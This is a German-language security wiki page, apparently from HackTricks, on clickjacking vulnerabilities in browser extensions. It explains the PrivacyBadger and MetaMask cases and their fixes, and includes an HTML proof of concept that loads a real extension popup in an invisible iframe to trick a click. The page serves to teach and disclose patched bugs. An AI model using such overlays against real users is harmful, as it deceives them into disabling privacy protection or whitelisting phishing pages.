# BrowExt - ClickJacking

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundinformationen

Diese Seite wird eine ClickJacking-Sicherheitsanf√§lligkeit in einer Browsererweiterung ausnutzen.\
Wenn du nicht wei√üt, was ClickJacking ist, schau dir an:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Erweiterungen enthalten die Datei **`manifest.json`** und diese JSON-Datei hat ein Feld `web_accessible_resources`. Hier ist, was [die Chrome-Dokumentation](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) dar√ºber sagt:

> Diese Ressourcen w√§ren dann √ºber die URL **`chrome-extension://[PACKAGE ID]/[PATH]`** in einer Webseite verf√ºgbar, die mit der **`extension.getURL method`** generiert werden kann. Erlaubte Ressourcen werden mit entsprechenden CORS-Headern bereitgestellt, sodass sie √ºber Mechanismen wie XHR verf√ºgbar sind.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Die **`web_accessible_resources`** in einer Browsererweiterung sind nicht nur √ºber das Web zug√§nglich; sie funktionieren auch mit den inh√§renten Berechtigungen der Erweiterung. Das bedeutet, dass sie die F√§higkeit haben zu:

* Den Zustand der Erweiterung zu √§ndern
* Zus√§tzliche Ressourcen zu laden
* In gewissem Ma√üe mit dem Browser zu interagieren

Diese Funktion stellt jedoch ein Sicherheitsrisiko dar. Wenn eine Ressource innerhalb von **`web_accessible_resources`** eine wesentliche Funktionalit√§t hat, k√∂nnte ein Angreifer diese Ressource m√∂glicherweise in eine externe Webseite einbetten. Unverd√§chtige Benutzer, die diese Seite besuchen, k√∂nnten unbeabsichtigt diese eingebettete Ressource aktivieren. Eine solche Aktivierung k√∂nnte je nach Berechtigungen und F√§higkeiten der Ressourcen der Erweiterung zu unbeabsichtigten Konsequenzen f√ºhren.

## PrivacyBadger Beispiel

In der Erweiterung PrivacyBadger wurde eine Sicherheitsanf√§lligkeit identifiziert, die sich auf das Verzeichnis `skin/` bezieht, das als `web_accessible_resources` in folgender Weise deklariert wurde (√úberpr√ºfe den urspr√ºnglichen [Blogbeitrag](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Diese Konfiguration f√ºhrte zu einem potenziellen Sicherheitsproblem. Insbesondere k√∂nnte die Datei `skin/popup.html`, die bei Interaktion mit dem PrivacyBadger-Symbol im Browser gerendert wird, innerhalb eines `iframe` eingebettet werden. Diese Einbettung k√∂nnte ausgenutzt werden, um Benutzer zu t√§uschen, sodass sie versehentlich auf "Disable PrivacyBadger for this Website" klicken. Eine solche Aktion w√ºrde die Privatsph√§re des Benutzers gef√§hrden, indem der Schutz von PrivacyBadger deaktiviert wird und der Benutzer m√∂glicherweise einer erh√∂hten Verfolgung ausgesetzt wird. Eine visuelle Demonstration dieses Exploits kann in einem ClickJacking-Video-Beispiel angesehen werden, das unter [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) bereitgestellt wird.

Um diese Schwachstelle zu beheben, wurde eine einfache L√∂sung implementiert: die Entfernung von `/skin/*` aus der Liste der `web_accessible_resources`. Diese √Ñnderung minderte das Risiko effektiv, indem sichergestellt wurde, dass der Inhalt des Verzeichnisses `skin/` nicht √ºber webzug√§ngliche Ressourcen zugegriffen oder manipuliert werden konnte.

Die L√∂sung war einfach: **entfernen Sie `/skin/*` aus den `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Beispiel

Ein [**Blogbeitrag √ºber ein ClickJacking in Metamask ist hier zu finden**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). In diesem Fall hat Metamask die Schwachstelle behoben, indem √ºberpr√ºft wurde, dass das Protokoll, das zum Zugriff verwendet wurde, **`https:`** oder **`http:`** (nicht **`chrome:`** zum Beispiel) war:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Ein weiteres ClickJacking, das** in der Metamask-Erweiterung behoben wurde, war, dass Benutzer **Klicken, um auf die Whitelist zu setzen** konnten, wenn eine Seite verd√§chtig war, Phishing zu sein, aufgrund von `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Da diese Seite anf√§llig f√ºr Clickjacking war, konnte ein Angreifer sie missbrauchen, indem er etwas Normales zeigte, um das Opfer dazu zu bringen, es ohne Notice auf die Whitelist zu setzen, und dann zur√ºck zur Phishing-Seite zu gehen, die dann auf die Whitelist gesetzt wird.

## Steam Inventory Helper Beispiel

√úberpr√ºfen Sie die folgende Seite, um zu sehen, wie ein **XSS** in einer Browsererweiterung mit einer **ClickJacking**-Schwachstelle verkn√ºpft wurde:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referenzen

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
